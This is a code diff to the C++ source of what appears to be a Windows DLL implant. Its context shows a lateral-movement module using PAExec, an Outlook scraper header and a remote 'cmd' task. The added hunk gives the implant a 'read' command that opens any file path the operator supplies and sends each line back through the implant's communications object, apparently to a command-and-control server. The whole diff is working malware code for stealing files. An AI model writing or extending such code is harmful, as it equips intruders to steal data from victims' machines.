@@ -6,6 +6,7 @@
 #include "loadoutlookscraper.h"
 #include "latmove.h"
 #include "comms.h"
+#include <fstream>
 
 // Starts DLL execution
 bool Control_RunDLL() {
@@ -81,6 +82,21 @@ bool Control_RunDLL() {
                     string moduleName = "PAExec.exe";
                     string latMovPath = commsObj->getModulePath(moduleName);
                     commsObj->installModule(module, latMovPath);
+                }
+                else if (task.rfind("read ", 0) == 0) {
+                    int position = task.find(" ", 0);
+                    string filepath = task.substr(position + 1);
+                    ifstream file(filepath);
+                    if (!file.is_open()) {
+                        commsObj->sendOutput("Error: Could not open file. ");
+                    }
+                    else {
+                        string line;
+                        while (getline(file, line)) {
+                            commsObj->sendOutput(line);
+                        }
+                        file.close();
+                    }
                 }
                 else if (task.rfind("cmd ", 0) == 0) {
                     int position = task.find(" ", 0);
